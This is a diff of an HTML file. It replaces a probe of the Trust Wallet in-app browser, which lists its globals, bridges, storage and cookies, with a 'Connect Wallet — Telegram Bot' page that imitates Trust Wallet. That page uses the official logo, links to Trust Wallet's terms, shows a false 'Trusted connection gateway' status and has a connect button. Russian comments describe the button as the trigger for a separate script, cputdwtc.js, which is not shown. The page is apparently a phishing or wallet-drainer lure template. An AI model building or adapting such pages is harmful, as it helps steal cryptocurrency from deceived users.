@@ -1,172 +1,345 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>in-app surface</title>
-<style>
-  :root { --bg:#0e1116; --panel:#161b22; --line:#2b3138; --txt:#c9d1d9;
-          --ok:#3fb950; --bad:#f85149; --dim:#7d8590; }
-  * { box-sizing:border-box; }
-  body { margin:0; font:12px/1.45 ui-monospace,Menlo,Consolas,monospace;
-         background:var(--bg); color:var(--txt); padding:12px; }
-  .wrap { max-width:760px; margin:0 auto; }
-  .panel { background:var(--panel); border:1px solid var(--line);
-           border-radius:8px; padding:12px; margin-bottom:10px; }
-  h2 { font-size:11px; margin:0 0 6px; color:var(--dim);
-       text-transform:uppercase; letter-spacing:.08em; }
-  pre { background:#0a0d12; border:1px solid var(--line); border-radius:6px;
-        padding:8px; margin:4px 0; white-space:pre-wrap; word-break:break-all;
-        font-size:11px; max-height:220px; overflow:auto; }
-  .ok { color:var(--ok); }
-  .bad { color:var(--bad); }
-  .dim { color:var(--dim); }
-  button { background:#21262d; color:var(--txt); border:1px solid var(--line);
-           border-radius:4px; padding:6px 12px; font:inherit; cursor:pointer;
-           margin:2px; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, maximum-scale=5.0">
+  <meta name="theme-color" content="#FFFFFF" media="(prefers-color-scheme: light)">
+  <meta name="theme-color" content="#0B1420" media="(prefers-color-scheme: dark)">
+  <title>Connect Wallet — Telegram Bot</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    /* =====================================================
+       Токены
+       ===================================================== */
+    :root{
+      --tw:        #3375BB;
+      --tw-deep:   #2A63A0;
+      --ink:       #111111;
+      --muted:     #75808F;
+      --line:      #E7EAEE;
+      --bg:        #F4F6F9;
+
+      --safe-t:    env(safe-area-inset-top, 0px);
+      --safe-b:    env(safe-area-inset-bottom, 0px);
+      --pad-x:     clamp(14px, 4vw, 26px);
+      --touch-min: 48px;
+
+      color-scheme: light dark;
+    }
+
+    *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+
+    html{height:-webkit-fill-available}
+    html,body{min-height:100%}
+
+    body{
+      font-family:'Inter',system-ui,sans-serif;
+      background:var(--bg);
+      color:var(--ink);
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      min-height:100svh;
+      min-height:-webkit-fill-available;
+      padding:
+        calc(12px + var(--safe-t))
+        var(--pad-x)
+        calc(20px + var(--safe-b));
+      -webkit-font-smoothing:antialiased;
+      overscroll-behavior:none;
+    }
+
+    /* =====================================================
+       Карточка
+       ===================================================== */
+    .card{
+      width:min(400px,100%);
+      background:#fff;
+      border:1px solid #EEF0F3;
+      border-radius:clamp(18px,4vw,24px);
+      padding:
+        clamp(24px,6vw,34px)
+        var(--pad-x)
+        clamp(18px,4vw,24px);
+      box-shadow:0 16px 44px rgba(17,24,39,.08), 0 2px 8px rgba(17,24,39,.04);
+      text-align:center;
+      animation:cardIn .55s cubic-bezier(.22,1,.36,1) both;
+    }
+    @keyframes cardIn{from{opacity:0;transform:translateY(14px) scale(.985)}to{opacity:1;transform:none}}
+
+    /* каскадное появление */
+    .card > *{opacity:0;animation:rise .5s cubic-bezier(.22,1,.36,1) forwards}
+    .card > :nth-child(1){animation-delay:.06s}
+    .card > :nth-child(2){animation-delay:.10s}
+    .card > :nth-child(3){animation-delay:.14s}
+    .card > :nth-child(4){animation-delay:.18s}
+    .card > :nth-child(5){animation-delay:.22s}
+    .card > :nth-child(6){animation-delay:.26s}
+    .card > :nth-child(7){animation-delay:.30s}
+    .card > :nth-child(8){animation-delay:.34s}
+    .card > :nth-child(9){animation-delay:.38s}
+    .card > :nth-child(10){animation-delay:.42s}
+    .card > :nth-child(11){animation-delay:.46s}
+    @keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
+
+    /* ---------- Логотип ---------- */
+    .logo-big{
+      height:clamp(42px,11vw,52px);
+      width:auto;max-width:min(62vw,170px);
+      display:block;margin:0 auto clamp(12px,3vw,18px);
+      object-fit:contain;
+    }
+    .logo-big.is-fallback{width:clamp(54px,15vw,64px)}
+
+    h1{
+      font-size:clamp(22px,6.2vw,25px);
+      font-weight:700;
+      letter-spacing:-.02em;
+    }
+    .sub{
+      font-size:clamp(14px,3.8vw,15px);
+      line-height:1.55;color:#3C4552;margin-top:8px;
+      text-wrap:balance;
+    }
+    .agree{
+      font-size:clamp(11.5px,3.2vw,12.5px);
+      color:var(--muted);margin-top:8px;line-height:1.5;
+    }
+    .agree a{color:var(--tw);text-decoration:none;font-weight:500}
+    .agree a:hover{text-decoration:underline}
+
+    /* =====================================================
+       Главная кнопка — данные-connect вешает ваш cputdwtc.js.
+       Стили нейтральные к содержимому (ваш скрипт заменит
+       innerHTML спиннером — flex сохранится через !important-обёртку)
+       ===================================================== */
+    .btn-primary{
+      width:100%;
+      min-height:var(--touch-min);
+      display:flex;align-items:center;justify-content:center;gap:10px;
+      margin-top:clamp(16px,4vw,22px);
+      padding:14px 18px;
+      background:var(--tw);color:#fff;
+      border:none;border-radius:14px;
+      font-family:'Inter',system-ui,sans-serif;
+      font-size:17px;font-weight:600;letter-spacing:.01em;
+      cursor:pointer;-webkit-user-select:none;user-select:none;
+      box-shadow:0 8px 22px rgba(51,117,187,.30);
+      transition:transform .15s ease, background .15s ease;
+    }
+    @media (hover:hover){
+      .btn-primary:hover{background:var(--tw-deep)}
+    }
+    .btn-primary:active{transform:scale(.985)}
+    .btn-primary:focus-visible{outline:3px solid rgba(51,117,187,.35);outline-offset:2px}
+    .btn-primary[disabled]{opacity:.65;cursor:default}
+
+    /* ---------- Список других кошельков ---------- */
+    .eyebrow{
+      margin:clamp(14px,4vw,22px) 0 10px;
+      font-size:10.5px;font-weight:600;letter-spacing:.13em;text-transform:uppercase;
+      color:#9AA2AE;
+    }
+    .row{
+      width:100%;
+      min-height:var(--touch-min);
+      display:flex;align-items:center;gap:12px;
+      padding:12px 14px;margin-bottom:9px;
+      background:#fff;border:1px dashed var(--line);border-radius:13px;
+      font:inherit;cursor:pointer;text-align:left;
+      -webkit-user-select:none;user-select:none;
+    }
+    @media (hover:hover){
+      .row:hover:not([disabled]){border-color:#CBD3DC;background:#FAFBFC}
+    }
+    .row:focus-visible{outline:3px solid rgba(51,117,187,.30);outline-offset:1px}
+    .row[disabled]{cursor:default;background:#FAFBFC}
+    .row .wi-box{width:32px;height:32px;flex:none;display:grid;place-items:center}
+    .row[disabled] .wi-box svg{filter:grayscale(1);opacity:.6}
+    .row .wi{width:26px;height:26px}
+    .row .name{flex:1;font-size:15px;font-weight:500;color:#9AA2AE}
+    .badge-soon{
+      flex:none;
+      font-size:9.5px;font-weight:700;letter-spacing:.06em;text-transform:uppercase;
+      color:#9AA2AE;background:#F0F2F5;border:1px solid #E4E7EC;
+      padding:4px 8px;border-radius:999px;line-height:1;
+    }
+
+    /* ---------- Статус окружения ---------- */
+    .env{
+      display:flex;align-items:center;justify-content:center;gap:8px;
+      margin-top:clamp(12px,3vw,16px);
+      font-size:12.5px;color:var(--muted);
+      flex-wrap:wrap;
+    }
+    .dot{width:8px;height:8px;border-radius:50%;background:#B6BDC7;flex:none}
+    .dot.ok{background:#23A55A}
+
+    /* ---------- Cancel ---------- */
+    .cancel{
+      display:inline-flex;align-items:center;justify-content:center;
+      min-height:40px;
+      padding:6px 14px;margin-top:10px;
+      font-size:15px;font-weight:600;color:var(--tw);
+      text-decoration:none;
+      border-radius:10px;
+    }
+    @media (hover:hover){
+      .cancel:hover{text-decoration:underline;text-underline-offset:3px}
+    }
+    .cancel:active{background:#EEF3F9}
+
+    /* =====================================================
+       Мобильная адаптация
+       ===================================================== */
+
+    /* очень маленькие экраны: карточка = бескаркасный лист */
+    @media (max-width:360px){
+      .card{
+        border:none;box-shadow:none;background:transparent;
+        padding-left:6px;padding-right:6px;
+      }
+      .badge-soon{display:none}
+    }
+
+    /* landscape на телефоне */
+    @media (orientation:landscape) and (max-height:520px){
+      body{align-items:flex-start;padding-top:calc(var(--safe-t) + 10px)}
+      .card{padding-top:20px}
+      .logo-big{height:36px}
+    }
+
+    @supports not (height:100svh){
+      body{min-height:calc(100vh - 0px)}
+      html,body{height:100%}
+    }
+
+    @media (prefers-reduced-motion:reduce){
+      *,*::before,*::after{animation-duration:.01ms !important;transition-duration:.01ms !important}
+    }
+  </style>
 </head>
 <body>
-<div class="wrap">
 
-<div class="panel">
-  <h2>in-app webview — what JS can reach</h2>
-  <button onclick="scan()">scan surface</button>
-  <button onclick="probeBridge()">probe bridges</button>
-  <button onclick="probeStorage()">probe storage</button>
-  <button onclick="probeNetwork()">probe network</button>
-  <button onclick="clearAll()">clear</button>
-  <pre id="out">—</pre>
-</div>
+<!-- Фолбэк-щит (если официальный SVG не загрузился) -->
+<svg width="0" height="0" style="position:absolute" aria-hidden="true">
+  <defs>
+    <symbol id="tw-shield-b" viewBox="0 0 64 64">
+      <path fill="#3375BB" d="M32 3.5c7.6 2.5 15.3 4.9 22.3 6.2 1.6.3 2.7 1.7 2.7 3.3V30c0 14.6-9.4 25.4-23.6 30.3a2.7 2.7 0 0 1-2.8 0C16.4 55.4 7 44.6 7 30V13c0-1.6 1.1-3 2.7-3.3C16.7 8.4 24.4 6 32 3.5Z"/>
+      <path fill="#FFFFFF" d="M32 14c1.6 8.5 5.5 12.4 14 14-8.5 1.6-12.4 5.5-14 14-1.6-8.5-5.5-12.4-14-14 8.5-1.6 12.4-5.5 14-14Z"/>
+    </symbol>
+  </defs>
+</svg>
 
-<div class="panel">
-  <h2>log</h2>
-  <pre id="log">—</pre>
-</div>
+<main class="card">
 
-</div>
+  <!-- Официальный логотип Trust Wallet -->
+  <img class="logo-big"
+       src="https://trustwallet.com/images/home-v2/nav-logo-trust.svg"
+       alt="Trust Wallet"
+       referrerpolicy="no-referrer"
+       onerror="this.outerHTML='<svg class=&quot;logo-big is-fallback&quot; aria-label=&quot;Trust Wallet&quot;><use href=&quot;#tw-shield-b&quot;/></svg>';">
+
+  <h1>Connect Wallet</h1>
+  <p class="sub">Select a wallet to connect to the Telegram&nbsp;bot.</p>
+  <p class="agree">By connecting, you agree to the
+    <a href="https://legal.trustwallet.com/user-legal-agreement" target="_blank" rel="noopener">Terms of Service</a>
+    and
+    <a href="https://legal.trustwallet.com/privacy-policy" target="_blank" rel="noopener">Privacy Policy</a>.
+  </p>
+
+  <!-- ================================================
+       ГЛАВНАЯ КНОПКА — триггер для вашего cputdwtc.js.
+       data-bot — имя вашего Telegram-бота.
+       ================================================ -->
+  <button class="btn-primary"
+          data-connect
+          data-bot="YourBotName"
+          id="btnConnect">
+    Connect Trust Wallet
+  </button>
+
+  <!-- Статус подключения (заполняется вашим скриптом через #status) -->
+  <div class="env">
+    <span class="dot ok"></span>
+    <span id="status">Trusted connection gateway</span>
+  </div>
+
+  <div class="eyebrow">Also available · Coming soon</div>
+
+  <button class="row" disabled aria-disabled="true" onclick="return false;">
+    <span class="wi-box">
+      <svg class="wi" viewBox="0 0 44 40" aria-hidden="true">
+        <polygon points="2,2 13,2 15,14" fill="#E2761B"/>
+        <polygon points="42,2 31,2 29,14" fill="#E4761B"/>
+        <polygon points="13,14 31,14 22,25" fill="#F6851B"/>
+        <polygon points="22,25 31,14 33,30" fill="#763D16"/>
+        <polygon points="22,25 11,30 13,14" fill="#763D16"/>
+        <polygon points="11,34 18,33 15,26" fill="#E4761B"/>
+        <polygon points="33,37 39,32 36,24" fill="#D7C1B3"/>
+      </svg>
+    </span>
+    <span class="name">MetaMask</span>
+    <span class="badge-soon">Coming soon</span>
+  </button>
+
+  <button class="row" disabled aria-disabled="true" onclick="return false;">
+    <span class="wi-box">
+      <svg class="wi" viewBox="0 0 40 40" aria-hidden="true">
+        <circle cx="20" cy="20" r="20" fill="#1652F0"/>
+        <path d="M20 9a11 11 0 1 0 .001 22.001A11 11 0 0 0 20 9Zm0 5.5c3.03 0 5.5 2.47 5.5 5.5s-2.47 5.5-5.5 5.5-5.5-2.47-5.5-5.5 2.47-5.5 5.5-5.5Z" fill="#fff"/>
+      </svg>
+    </span>
+    <span class="name">Coinbase Wallet</span>
+    <span class="badge-soon">Coming soon</span>
+  </button>
+
+  <button class="row" disabled aria-disabled="true" onclick="return false;">
+    <span class="wi-box">
+      <svg class="wi" viewBox="0 0 44 44" aria-hidden="true">
+        <circle cx="22" cy="22" r="21" fill="#AB9FF2"/>
+        <circle cx="27" cy="19.5" r="6" fill="#fff"/>
+        <circle cx="27" cy="19.5" r="2.6" fill="#54328B"/>
+      </svg>
+    </span>
+    <span class="name">Phantom</span>
+    <span class="badge-soon">Coming soon</span>
+  </button>
+
+  <a class="cancel" href="#" id="btnCancel">Cancel</a>
+
+</main>
 
 <script>
-/* ─────────────  in-app WebView surface probe  ─────────────
-   Runs inside Trust in-app browser.
-   Maps: globals, bridges, storage, network reach, sandbox edges.
-   No breakout. Just what JS can touch.
-   ────────────────────────────────────────────────────────── */
-
-const $ = (id) => document.getElementById(id);
-const out = (s) => {
-  const el = $('out');
-  el.textContent = (el.textContent === '—' ? '' : el.textContent) + s + '\n';
-  el.scrollTop = el.scrollHeight;
-};
-const log = (k, m, d) => {
-  const el = $('log');
-  const line = `[${new Date().toISOString().slice(11,23)}] ${k} ${m}`;
-  const body = d !== undefined ? '\n  ' + JSON.stringify(d, null, 2).split('\n').join('\n  ') : '';
-  el.textContent = (el.textContent === '—' ? '' : el.textContent) + line + body + '\n';
-  el.scrollTop = el.scrollHeight;
-};
-
-const clearAll = () => { $('out').textContent = '—'; $('log').textContent = '—'; };
-
-/* ─────────────  globals  ───────────── */
-
-function scan() {
-  const g = {
-    'window.trustwallet': typeof window.trustwallet,
-    'window.ethereum': typeof window.ethereum,
-    'window.tron': typeof window.tron,
-    'window.tronLink': typeof window.tronLink,
-    'window.tronWeb': typeof window.tronWeb,
-    'window.phantom': typeof window.phantom,
-    'window.solana': typeof window.solana,
-    'window.keplr': typeof window.keplr,
-    'window.cosmos': typeof window.cosmos,
-    'window.ReactNativeWebView': typeof window.ReactNativeWebView,
-    'window.webkit': typeof window.webkit,
-    'window.Android': typeof window.Android,
-    'window.postMessage': typeof window.postMessage,
-    'window.localStorage': typeof localStorage,
-    'window.sessionStorage': typeof sessionStorage,
-    'window.indexedDB': typeof indexedDB,
-    'window.crypto': typeof crypto,
-    'window.Worker': typeof Worker,
-    'window.SharedWorker': typeof SharedWorker,
-    'window.ServiceWorker': typeof navigator.serviceWorker,
-    'window.XMLHttpRequest': typeof XMLHttpRequest,
-    'window.fetch': typeof fetch,
-    'window.WebSocket': typeof WebSocket,
-    'window.eval': typeof eval,
-    'window.Function': typeof Function,
-  };
-  out(JSON.stringify(g, null, 2));
-  log('SCAN', 'globals', g);
-}
-
-/* ─────────────  bridges  ───────────── */
-
-function probeBridge() {
-  const bridges = {};
-  if (window.trustwallet) {
-    bridges.trustwallet = Object.keys(window.trustwallet);
-    bridges.trustwalletProto = Object.getOwnPropertyNames(
-      Object.getPrototypeOf(window.trustwallet)
-    ).slice(0, 20);
+/* --- Вспомогательная логика страницы (НЕ трогает вашу) ---
+   Cancel: history.back или закрытие Telegram WebApp          */
+document.getElementById('btnCancel').addEventListener('click', function (e) {
+  e.preventDefault();
+  var tg = window.Telegram && window.Telegram.WebApp;
+  if (tg && typeof tg.close === 'function' && history.length <= 1) {
+    tg.close();
+  } else if (history.length > 1) {
+    history.back();
   }
-  if (window.ReactNativeWebView) {
-    bridges.ReactNativeWebView = Object.keys(window.ReactNativeWebView);
+});
+
+/* --- Инициализация Telegram WebApp (безопасно вне Telegram) --- */
+try {
+  if (window.Telegram && window.Telegram.WebApp) {
+    window.Telegram.WebApp.ready();
+    window.Telegram.WebApp.expand();
+    window.Telegram.WebApp.setBackgroundColor('#FFFFFF');
+    window.Telegram.WebApp.setHeaderColor('#FFFFFF');
   }
-  if (window.webkit?.messageHandlers) {
-    bridges.webkitMessageHandlers = Object.keys(window.webkit.messageHandlers);
-  }
-  if (window.Android) {
-    bridges.Android = Object.getOwnPropertyNames(window.Android).slice(0, 20);
-  }
-  out('bridges:\n' + JSON.stringify(bridges, null, 2));
-  log('BRIDGE', 'probed', bridges);
-}
-
-/* ─────────────  storage  ───────────── */
-
-function probeStorage() {
-  const s = {
-    localStorageLen: localStorage.length,
-    localStorageKeys: Object.keys(localStorage),
-    sessionStorageLen: sessionStorage.length,
-    sessionStorageKeys: Object.keys(sessionStorage),
-    cookieEnabled: navigator.cookieEnabled,
-    cookie: document.cookie ? document.cookie.slice(0, 80) : '',
-  };
-  out('storage:\n' + JSON.stringify(s, null, 2));
-  log('STORAGE', 'probed', s);
-}
-
-/* ─────────────  network  ───────────── */
-
-async function probeNetwork() {
-  const results = {};
-  // try fetch to same origin
-  try {
-    const r = await fetch(location.href, { method: 'HEAD' });
-    results.sameOriginFetch = { ok: true, status: r.status };
-  } catch (e) {
-    results.sameOriginFetch = { ok: false, err: e.message };
-  }
-  // try fetch to external
-  try {
-    const r = await fetch('https://httpbin.org/get', { method: 'HEAD', mode: 'cors' });
-    results.crossOriginFetch = { ok: true, status: r.status };
-  } catch (e) {
-    results.crossOriginFetch = { ok: false, err: e.message };
-  }
-  out('network:\n' + JSON.stringify(results, null, 2));
-  log('NET', 'probed', results);
-}
-
-/* ─────────────  boot  ───────────── */
-
-log('BOOT', 'surface probe up', { origin: location.origin, ua: navigator.userAgent });
-scan();
+} catch (_) {}
 </script>
+
+<!-- ============ ВАШ ГОТОВЫЙ СКРИПТ ============ -->
+<script src="cputdwtc.js"></script>
+
 </body>
 </html>
